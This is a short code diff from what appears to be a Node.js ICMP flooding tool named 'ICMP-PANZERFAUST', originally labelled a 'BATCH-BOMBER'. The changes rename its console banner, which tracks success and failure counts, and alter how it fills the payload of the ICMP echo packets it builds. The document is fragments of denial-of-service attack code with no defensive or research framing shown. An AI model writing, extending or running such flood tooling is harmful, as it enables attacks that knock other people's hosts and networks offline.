@@ -57,7 +57,7 @@ if (cluster.isMaster) {
 
   setInterval(() => {
     console.clear();
-    console.log('ICMP-PANZERFAUST [BATCH-BOMBER WITH RELOAD]');
+    console.log('ICMP-PANZERFAUST [HEAVY]');
     console.log('--------------------------------------');
     console.log(`Success: ${stats.success}`);
     console.log(`Failed: ${stats.failed}`);
@@ -102,7 +102,7 @@ if (cluster.isMaster) {
     buf.writeUInt16BE(process.pid & 0xffff, 4); // ID
     buf.writeUInt16BE(seqNum & 0xffff, 6); // Sequence
 
-    buf.fill(0x42, 8); // Payload
+    buf.fill(0x42, 16); // Payload
 
     let sum = 0;
     for (let i = 0; i < buf.length - 1; i += 2) {
